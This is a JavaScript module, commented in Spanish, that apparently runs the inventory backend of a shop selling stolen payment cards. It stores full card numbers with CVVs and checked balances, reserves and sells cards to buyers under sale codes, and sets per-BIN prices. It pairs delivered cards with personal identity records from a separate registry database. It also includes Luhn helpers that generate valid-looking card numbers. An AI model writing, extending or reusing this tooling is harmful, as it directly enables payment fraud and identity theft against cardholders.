/* stock.js - inventario de CC con estados, trazabilidad y entrega.
 *
 * Estados: DISPONIBLE -> RESERVADA -> VENDIDA ; BAJA para las muertas.
 * Nada se borra: una vendida sale de los listados de disponible pero queda con
 * su codigo de venta, quien la vendio y cuando. Toda accion escribe en movs.
 *
 * El numero de tarjeta es UNICO: recargar el mismo lote no duplica.
 * ref es un numero estable por BIN, asignado al cargar, para referirse a una CC
 * sin que se corra la numeracion del listado.
 */

import path from 'node:path';
import fs from 'node:fs';
import { DatabaseSync } from 'node:sqlite';
import { armarBloque, SEPARADOR } from './lote.js';

const RUTA = process.env.RESOLVER_STOCK_DB || path.join(import.meta.dirname, '..', 'datos', 'stock.db');
export const ETIQUETA_DEFECTO = 'Saldeadas';
export const ESTADOS = ['DISPONIBLE', 'RESERVADA', 'VENDIDA', 'BAJA'];

let db = null;

function col(tabla, nombre, def) {
  const cols = db.prepare('PRAGMA table_info(' + tabla + ')').all().map((c) => c.name);
  if (!cols.includes(nombre)) db.exec('ALTER TABLE ' + tabla + ' ADD COLUMN ' + nombre + ' ' + def);
}

export function base() {
  if (db) return db;
  fs.mkdirSync(path.dirname(RUTA), { recursive: true });
  db = new DatabaseSync(RUTA);
  db.exec('PRAGMA busy_timeout = 8000');
  db.exec('PRAGMA journal_mode = WAL');
  db.exec(
    "CREATE TABLE IF NOT EXISTS cc(" +
    "id INTEGER PRIMARY KEY AUTOINCREMENT, numero TEXT UNIQUE NOT NULL, " +
    "mes TEXT, anio TEXT, cvv TEXT, bin TEXT, marca TEXT, dni TEXT, titular TEXT, " +
    "nro_tramite TEXT, fecha_nac TEXT, mail TEXT, telefono TEXT, direccion TEXT, " +
    "ciudad TEXT, provincia TEXT, estado TEXT NOT NULL DEFAULT 'DISPONIBLE', " +
    "saldo_disp TEXT, saldo_total TEXT, saldo_fecha TEXT, " +
    "etiqueta TEXT DEFAULT 'Saldeadas', precio TEXT, lote TEXT, notas TEXT, " +
    "creado TEXT NOT NULL, vendido_a TEXT, vendido_el TEXT, codigo_venta TEXT)"
  );
  db.exec(
    "CREATE TABLE IF NOT EXISTS movs(" +
    "id INTEGER PRIMARY KEY AUTOINCREMENT, cc_id INTEGER NOT NULL, accion TEXT NOT NULL, " +
    "usuario TEXT, chat_id TEXT, fecha TEXT NOT NULL, detalle TEXT)"
  );
  db.exec('CREATE INDEX IF NOT EXISTS idx_cc_bin ON cc(bin, estado)');
  db.exec('CREATE INDEX IF NOT EXISTS idx_movs_cc ON movs(cc_id)');
  col('cc', 'ref', 'INTEGER');
  col('cc', 'saldo_disp_num', 'INTEGER');
  col('cc', 'saldo_total_num', 'INTEGER');
  col('cc', 'moneda', "TEXT DEFAULT 'CLP'");
  col('cc', 'reservado_por', 'TEXT');
  col('cc', 'reservado_el', 'TEXT');
  col('cc', 'reserva_vence', 'TEXT');col('cc', 'codigo_venta', 'TEXT');
  db.exec('CREATE INDEX IF NOT EXISTS idx_cc_estado ON cc(estado)');
  db.exec('CREATE INDEX IF NOT EXISTS idx_cc_ref ON cc(bin, ref)');
  db.exec('CREATE INDEX IF NOT EXISTS idx_cc_codigo ON cc(codigo_venta)');
  return db;
}

export const ahora = () => new Date().toISOString();
export const soloDigitos = (v) => String(v === null || v === undefined ? '' : v).replace(/\D/g, '');
export const binDe = (n) => soloDigitos(n).slice(0, 6);

export function marcaDe(n) {
  const s = soloDigitos(n);
  if (/^4/.test(s)) return 'Visa';
  if (/^(5[1-5]|2[2-7])/.test(s)) return 'Master';
  if (/^3[47]/.test(s)) return 'Amex';
  if (/^(6011|65)/.test(s)) return 'Discover';
  return null;
}

export function luhn(n) {
  const s = soloDigitos(n);
  if (s.length < 12) return false;
  let suma = 0;
  let par = false;
  for (let i = s.length - 1; i >= 0; i--) {
    let d = s.charCodeAt(i) - 48;
    if (par) { d *= 2; if (d > 9) d -= 9; }
    suma += d;
    par = !par;
  }
  return suma % 10 === 0;
}

export function mascara(n) {
  const s = soloDigitos(n);
  return s.slice(0, 8) + 'xxxx' + s.slice(-4);
}

export function saldoANumero(txt) {
  const s = String(txt === null || txt === undefined ? '' : txt).trim().toLowerCase().replace(/\s/g, '').replace(',', '.');
  if (!s) return null;
  if (/^\d+$/.test(s)) return Number(s);
  let num = 0;
  let resto = s;
  let m = resto.match(/^(\d+(?:\.\d+)?)m/);
  if (m) { num += Number(m[1]) * 1000000; resto = resto.slice(m[0].length); }
  m = resto.match(/^(\d+(?:\.\d+)?)k/);
  if (m) { num += Number(m[1]) * 1000; resto = resto.slice(m[0].length); }
  if (resto === '') return num || null;
  if (/^\d+$/.test(resto)) return num + Number(resto);
  return null;
}

function mov(cc_id, accion, usuario, chat_id, detalle) {
  base().prepare('INSERT INTO movs(cc_id, accion, usuario, chat_id, fecha, detalle) VALUES(?,?,?,?,?,?)')
    .run(cc_id, accion, usuario || null, chat_id || null, ahora(), detalle || null);
}

export function parsearLineasCarga(texto) {
  const out = [];
  const lineas = String(texto === null || texto === undefined ? '' : texto).split(/\r?\n/);
  for (const cruda of lineas) {
    let s = cruda.replace(/^\uFEFF/, '').trim();
    s = s.replace(/%7C/gi, '|').replace(/%2C/gi, ',').replace(/%3B/gi, ';').replace(/%20/g, ' ').replace(/%09/g, ' ');
    if (!s || s.charAt(0) === '#') continue;
    const partes = s.split(/\s*[\|\t;,\u00b7]\s*/).map((x) => x.trim());
    const numero = soloDigitos(partes[0]);
    if (!numero) continue;
    let disp = partes[4] || null;
    let total = partes[5] || null;
    if (disp && disp.indexOf('/') !== -1) {
      const par = disp.split('/');
      disp = par[0] || null;
      total = par[1] || null;
    }
    out.push({ numero: numero, mes: partes[1] || null, anio: partes[2] || null, cvv: partes[3] || null, saldo_disp: disp, saldo_total: total, notas: partes[6] || null });
  }
  return out;
}

export function cargar(entrada, opts = {}) {
  const d = base();
  const lineas = typeof entrada === 'string' ? parsearLineasCarga(entrada) : entrada;
  const usuario = opts.usuario || null;
  const chat_id = opts.chat_id || null;
  const lote = opts.lote || ahora().slice(0, 19).replace('T', ' ');
  const res = { nuevas: 0, duplicadas: [], invalidas: [], ids: [] };
  const ins = d.prepare(
    'INSERT INTO cc(numero, mes, anio, cvv, bin, marca, saldo_disp, saldo_total, ' +
    'saldo_disp_num, saldo_total_num, moneda, etiqueta, lote, notas, creado, ref) ' +
    'VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)'
  );
  for (const l of lineas) {
    const numero = soloDigitos(l.numero);
    if (!numero) { res.invalidas.push({ numero: l.numero || '(vacio)', motivo: 'vacio' }); continue; }
    if (!luhn(numero)) { res.invalidas.push({ numero: numero, motivo: 'luhn' }); continue; }
    const ya = d.prepare('SELECT id, estado, vendido_el FROM cc WHERE numero = ?').get(numero);
    if (ya) { res.duplicadas.push({ numero: numero, estado: ya.estado, vendido_el: ya.vendido_el }); continue; }
    const bin = binDe(numero);
    const prev = d.prepare('SELECT MAX(ref) m FROM cc WHERE bin = ?').get(bin);
    const ref = (prev && prev.m ? prev.m : 0) + 1;
    const info = ins.run(numero, l.mes, l.anio, l.cvv, bin, marcaDe(numero), l.saldo_disp, l.saldo_total, saldoANumero(l.saldo_disp), saldoANumero(l.saldo_total), opts.moneda || 'CLP', opts.etiqueta || ETIQUETA_DEFECTO, lote, l.notas, ahora(), ref);
    const id = Number(info.lastInsertRowid);
    mov(id, 'CARGA', usuario, chat_id, 'lote=' + lote + ' bin=' + bin + ' ref=' + ref);
    res.nuevas += 1;
    res.ids.push(id);
  }
  return res;
}

export function listarBin(bin, opts = {}) {
  const d = base();
  const filas = d.prepare("SELECT id, numero, ref, etiqueta, saldo_disp, saldo_total FROM cc WHERE bin = ? AND estado = 'DISPONIBLE' ORDER BY id").all(String(bin));
  if (!filas.length) return null;
  const etiqueta = opts.etiqueta || filas[0].etiqueta || ETIQUETA_DEFECTO;
  const salida = ['\u{1F4B0} ' + etiqueta + ' BIN ' + bin + ' (' + filas.length + ')', ''];
  filas.forEach((f, i) => {
    let l = (i + 1) + '> ' + mascara(f.numero);
    if (opts.refs) l += ' #' + f.ref;
    if (f.saldo_disp || f.saldo_total) l += ' \u00b7 ' + (f.saldo_disp || '-') + '/' + (f.saldo_total || '-');
    salida.push(l);
  });
  return salida.join('\n');
}

export function listado(opts = {}) {
  const bins = base().prepare("SELECT DISTINCT bin FROM cc WHERE estado = 'DISPONIBLE' ORDER BY bin").all();
  const partes = [];
  for (const b of bins) {
    const t = listarBin(b.bin, opts);
    if (t) partes.push(t);
  }
  return partes.join('\n\n');
}

export function resumen() {
  return base().prepare("SELECT bin, MAX(etiqueta) etiqueta, SUM(CASE WHEN estado = 'DISPONIBLE' THEN 1 ELSE 0 END) disp, SUM(CASE WHEN estado = 'RESERVADA' THEN 1 ELSE 0 END) res, SUM(CASE WHEN estado = 'VENDIDA' THEN 1 ELSE 0 END) vend, SUM(CASE WHEN estado = 'BAJA' THEN 1 ELSE 0 END) baja, SUM(CASE WHEN estado = 'DISPONIBLE' THEN COALESCE(saldo_total_num, 0) ELSE 0 END) saldo FROM cc GROUP BY bin ORDER BY bin").all();
}

export function buscar(ref) {
  const d = base();
  const s = String(ref === null || ref === undefined ? '' : ref).trim();
  if (!s) return [];
  const solo = soloDigitos(s);
  if (solo && solo.length <= 8) {
    const porNumero = d.prepare('SELECT * FROM cc WHERE numero = ? OR numero LIKE ?').all(solo, '%' + solo);
    if (porNumero.length) return porNumero;
    const porRef = d.prepare('SELECT * FROM cc WHERE ref = ?').all(Number(solo));
    if (porRef.length) return porRef;
  }
  return d.prepare('SELECT * FROM cc WHERE numero LIKE ?').all('%' + solo + '%');
}

export function movs(ref) {
  const d = base();
  const ccs = buscar(ref);
  const out = [];
  for (const c of ccs) {
    out.push({ cc: c, movs: d.prepare('SELECT accion, usuario, chat_id, fecha, detalle FROM movs WHERE cc_id = ? ORDER BY id').all(c.id) });
  }
  return out;
}

function candidatos(opts) {
  const d = base();
  const cant = Math.max(1, Number(opts.cantidad || 1));
  let orden = 'id';
  if (opts.modo === 'mayor') orden = 'COALESCE(saldo_total_num, 0) DESC, id';
  if (opts.modo === 'menor') orden = 'COALESCE(saldo_total_num, 0) ASC, id';
  if (opts.bin) {
    return d.prepare("SELECT * FROM cc WHERE bin = ? AND estado = 'DISPONIBLE' ORDER BY " + orden + ' LIMIT ?').all(String(opts.bin), cant);
  }
  return d.prepare("SELECT * FROM cc WHERE estado = 'DISPONIBLE' ORDER BY " + orden + ' LIMIT ?').all(cant);
}

function proximoCodigo() {
  const n = base().prepare('SELECT COUNT(DISTINCT codigo_venta) c FROM cc WHERE codigo_venta IS NOT NULL').get().c;
  const f = new Date().toISOString().slice(0, 10).replace(/-/g, '');
  return 'V-' + f + '-' + String(n + 1).padStart(3, '0');
}

export function vender(opts = {}) {
  const d = base();
  const ccs = opts.refs && opts.refs.length ? opts.refs.flatMap((r) => buscar(r)) : candidatos(opts);
  const libres = ccs.filter((c) => c.estado === 'DISPONIBLE' || c.estado === 'RESERVADA');
  if (!libres.length) return { codigo: null, ccs: [] };
  const codigo = opts.codigo || proximoCodigo();
  const upd = d.prepare("UPDATE cc SET estado = 'VENDIDA', vendido_a = ?, vendido_el = ?, codigo_venta = ? WHERE id = ? AND estado IN ('DISPONIBLE','RESERVADA')");
  const hechas = [];
  for (const c of libres) {
    const r = upd.run(opts.comprador || null, ahora(), codigo, c.id);
    if (r.changes) {
      mov(c.id, 'VENTA', opts.usuario, opts.chat_id, 'codigo=' + codigo + (opts.comprador ? ' comprador=' + opts.comprador : ''));
      hechas.push(Object.assign({}, c, { estado: 'VENDIDA', codigo_venta: codigo }));
    }
  }
  return { codigo: codigo, ccs: hechas };
}

export function devolver(refs, usuario, chat_id) {
  const d = base();
  const hechas = [];
  for (const r of refs) {
    for (const c of buscar(r)) {
      if (c.estado !== 'VENDIDA') continue;
      d.prepare("UPDATE cc SET estado='DISPONIBLE', vendido_a=NULL, vendido_el=NULL, codigo_venta=NULL WHERE id=?").run(c.id);
      mov(c.id, 'DEVOLUCION', usuario, chat_id, 'codigo=' + (c.codigo_venta || ''));
      hechas.push(c.ref);
    }
  }
  return hechas;
}

export function baja(refs, usuario, chat_id, motivo) {
  const d = base();
  const hechas = [];
  for (const r of refs) {
    for (const c of buscar(r)) {
      if (c.estado === 'BAJA') continue;
      d.prepare("UPDATE cc SET estado='BAJA', reservado_por=NULL, reserva_vence=NULL WHERE id=?").run(c.id);
      mov(c.id, 'BAJA', usuario, chat_id, motivo || '');
      hechas.push(c.ref);
    }
  }
  return hechas;
}
export function setSaldo(ref, disp, total, usuario, chat_id) {
  const d = base();
  const c = buscar(ref)[0];
  if (!c) return null;
  const dn = disp === null || disp === undefined || disp === '' ? null : saldoANumero(disp);
  const tn = total === null || total === undefined || total === '' ? dn : saldoANumero(total);
  d.prepare('UPDATE cc SET saldo_disp=?, saldo_total=?, saldo_disp_num=?, saldo_total_num=?, saldo_fecha=? WHERE id=?').run(dn === null ? null : String(dn), tn === null ? null : String(tn), dn, tn, ahora(), c.id);
  mov(c.id, 'SALDO', usuario, chat_id, 'disp=' + dn + ' total=' + tn);
  return { ref: c.ref, numero: c.numero, disp: dn, total: tn };
}

export function setEtiqueta(ref, etiqueta, usuario, chat_id) {
  const d = base();
  const c = buscar(ref)[0];
  if (!c) return null;
  d.prepare('UPDATE cc SET etiqueta=? WHERE id=?').run(String(etiqueta), c.id);
  mov(c.id, 'ETIQUETA', usuario, chat_id, String(etiqueta));
  return { ref: c.ref, etiqueta: String(etiqueta) };
}

export function reservar(refs, quien, minutos, usuario, chat_id) {
  const d = base();
  const mins = Math.max(1, Number(minutos || 15));
  const hasta = new Date(Date.now() + mins * 60000).toISOString();
  const hechas = [];
  for (const r of refs) {
    for (const c of buscar(r)) {
      if (c.estado !== 'DISPONIBLE') continue;
      d.prepare("UPDATE cc SET estado='RESERVADA', reservado_por=?, reservado_el=?, reserva_vence=? WHERE id=?").run(quien || null, ahora(), hasta, c.id);
      mov(c.id, 'RESERVA', usuario, chat_id, 'para=' + (quien || '') + ' vence=' + hasta);
      hechas.push(c.ref);
    }
  }
  return { hasta: hasta, refs: hechas };
}

export function expirarReservas() {
  const d = base();
  const vencidas = d.prepare("SELECT id, ref FROM cc WHERE estado='RESERVADA' AND reserva_vence IS NOT NULL AND reserva_vence < ?").all(ahora());
  for (const c of vencidas) {
    d.prepare("UPDATE cc SET estado='DISPONIBLE', reservado_por=NULL, reserva_vence=NULL WHERE id=?").run(c.id);
    mov(c.id, 'RESERVA_VENCIDA', null, null, 'ref=' + c.ref);
  }
  return vencidas.map((c) => c.ref);
}
export function preciosTabla() {
  base().exec('CREATE TABLE IF NOT EXISTS precios(bin TEXT PRIMARY KEY, precio INTEGER NOT NULL, moneda TEXT, actualizado TEXT)');
}

export function setPrecio(bin, precio, moneda) {
  preciosTabla();
  base().prepare('INSERT INTO precios(bin, precio, moneda, actualizado) VALUES(?,?,?,?) ON CONFLICT(bin) DO UPDATE SET precio=excluded.precio, moneda=excluded.moneda, actualizado=excluded.actualizado').run(String(bin), Number(precio), moneda || 'CLP', ahora());
  return { bin: String(bin), precio: Number(precio) };
}

export function precios() {
  preciosTabla();
  return base().prepare('SELECT bin, precio, moneda FROM precios ORDER BY bin').all();
}

export function porCodigo(codigo) {
  return base().prepare('SELECT * FROM cc WHERE codigo_venta = ? ORDER BY id').all(String(codigo));
}

export function stats() {
  const d = base();
  const porEstado = d.prepare('SELECT estado, COUNT(*) n, SUM(COALESCE(saldo_total_num,0)) saldo FROM cc GROUP BY estado').all();
  const total = d.prepare('SELECT COUNT(*) n FROM cc').get().n;
  const ventas = d.prepare('SELECT COUNT(DISTINCT codigo_venta) n FROM cc WHERE codigo_venta IS NOT NULL').get().n;
  return { total, ventas, porEstado, bins: resumen() };
}

export function alertas(umbral = 3) {
  return base().prepare("SELECT bin, COUNT(*) n FROM cc WHERE estado='DISPONIBLE' GROUP BY bin HAVING n <= ? ORDER BY n").all(Number(umbral));
}
import { seleccionarTitulares } from './lote.js';

const RUTA_PADRON = process.env.RESOLVER_DB || path.join(import.meta.dirname, '..', 'datos', 'padron.db');
let padron = null;

function abrirPadron() {
  if (!padron) {
    padron = new DatabaseSync(RUTA_PADRON);
    padron.exec('PRAGMA busy_timeout = 5000');
  }
  return padron;
}

export function titularesPara(n, saltar) {
  return seleccionarTitulares(abrirPadron(), { cantidad: n, saltar: saltar || 0 });
}

export function textoEntrega(ccs, opts = {}) {
  const formato = opts.formato || 'bloques';
  if (formato === 'compacto') {
    return ccs.map((c) => [c.numero, c.mes, c.anio, c.cvv].filter((x) => x !== null && x !== undefined && x !== '').join('|')).join('\n');
  }
  if (formato === 'listado') {
    return ccs.map((c, i) => (i + 1) + '> ' + mascara(c.numero) + ' ' + (c.mes || '') + '/' + (c.anio || '') + ' ' + (c.cvv || '')).join('\n');
  }
  const desde = Number(opts.desde || 1);
  const tit = Array.isArray(opts.titulares) ? opts.titulares : [];
  return ccs.map((c, i) => armarBloque(tit[i] || { dni: c.dni, titular: c.titular, mail: c.mail, telefono: c.telefono, direccion: c.direccion, ciudad: c.ciudad, provincia: c.provincia }, { numero: c.numero, mes: c.mes, anio: c.anio, cvv: c.cvv }, desde + i)).join(SEPARADOR);
}

export function entrega(opts = {}) {
  const r = vender(opts);
  if (!r.codigo) return { codigo: null, ccs: [], texto: '' };
  const titulares = opts.titulares || (opts.conTitulares === false ? [] : titularesPara(r.ccs.length, opts.saltar));
  const texto = textoEntrega(r.ccs, { formato: opts.formato, desde: opts.desde, titulares });
  mov(r.ccs[0].id, 'ENTREGA', opts.usuario, opts.chat_id, 'codigo=' + r.codigo + ' n=' + r.ccs.length);
  return { codigo: r.codigo, ccs: r.ccs, texto };
}

export function reentrega(codigo, opts = {}) {
  const ccs = porCodigo(codigo);
  if (!ccs.length) return null;
  const texto = textoEntrega(ccs, { formato: opts.formato, desde: opts.desde, titulares: opts.titulares });
  mov(ccs[0].id, 'REENTREGA', opts.usuario, opts.chat_id, 'codigo=' + codigo + ' n=' + ccs.length);
  return { codigo, ccs, texto };
}
export function exportar(opts = {}) {
  const d = base();
  const filas = opts.estado
    ? d.prepare('SELECT * FROM cc WHERE estado = ? ORDER BY bin, ref').all(opts.estado)
    : d.prepare('SELECT * FROM cc ORDER BY bin, ref').all();
  if ((opts.formato || 'csv') === 'txt') {
    return filas.map((c) => [c.numero, c.mes, c.anio, c.cvv, c.saldo_disp, c.saldo_total].map((x) => (x === null || x === undefined ? '' : x)).join('|')).join('\n');
  }
  const cols = ['id', 'numero', 'mes', 'anio', 'cvv', 'bin', 'marca', 'estado', 'saldo_disp', 'saldo_total', 'etiqueta', 'ref', 'codigo_venta', 'vendido_a', 'vendido_el', 'creado'];
  const lineas = filas.map((f) => cols.map((k) => (f[k] === null || f[k] === undefined ? '' : String(f[k]))).join(';'));
  return [cols.join(';')].concat(lineas).join('\n');
}

export function purgar(dias = 30) {
  const d = base();
  const corte = new Date(Date.now() - Number(dias) * 86400000).toISOString();
  const viejas = d.prepare("SELECT * FROM cc WHERE estado = 'VENDIDA' AND vendido_el IS NOT NULL AND vendido_el < ?").all(corte);
  if (!viejas.length) return { archivadas: 0, archivo: null };
  const dir = path.join(path.dirname(RUTA), 'archivo');
  fs.mkdirSync(dir, { recursive: true });
  const archivo = path.join(dir, 'stock-vendidas-' + ahora().slice(0, 10) + '.txt');
  fs.appendFileSync(archivo, viejas.map((c) => [c.numero, c.mes, c.anio, c.cvv, c.estado, c.codigo_venta, c.vendido_a].join('|')).join('\n') + '\n');
  const del = d.prepare('DELETE FROM cc WHERE id = ?');
  for (const c of viejas) del.run(c.id);
  return { archivadas: viejas.length, archivo };
}

export function backup() {
  base().exec('PRAGMA wal_checkpoint(TRUNCATE)');
  const dir = path.join(path.dirname(RUTA), 'backups');
  fs.mkdirSync(dir, { recursive: true });
  const destino = path.join(dir, 'stock-' + ahora().slice(0, 19).replace(/[:T]/g, '') + '.db');
  fs.copyFileSync(RUTA, destino);
  return destino;
}

export function ultimosMovs(n = 50) {
  return base().prepare('SELECT m.fecha, m.accion, m.usuario, m.chat_id, m.detalle, c.ref, c.numero, c.estado FROM movs m JOIN cc c ON c.id = m.cc_id ORDER BY m.id DESC LIMIT ?').all(Math.max(1, Number(n) || 50));
}

/** Digito verificador Luhn de un numero (se calcula sobre los digitos dados). */
export function digitoLuhn(n){
  const s=soloDigitos(n);
  if(!s)return null;
  let suma=0;
  let doble=true;
  for(let i=s.length-1;i>=0;i--){
    let d=s.charCodeAt(i)-48;
    if(doble){ d*=2; if(d>9) d-= 9; }
    suma+=d;
    doble=!doble;
  }
  return (10-(suma%10))%10;
}

/** Numero completo: base + digito verificador. */
export function numeroConLuhn(base){
  const s=soloDigitos(base);
  return s+digitoLuhn(s);
}

/** Numero demo valido para pruebas: prefijo + relleno aleatorio + Luhn. */
export function demoNumero(prefijo,largo){
  const p=soloDigitos(prefijo)||'516585';
  const n=Number(largo)||16;
  let s=p;
  while(s.length<n-1) s+=String(Math.floor(Math.random()*10));
  return numeroConLuhn(s.slice(0,n-1));
}
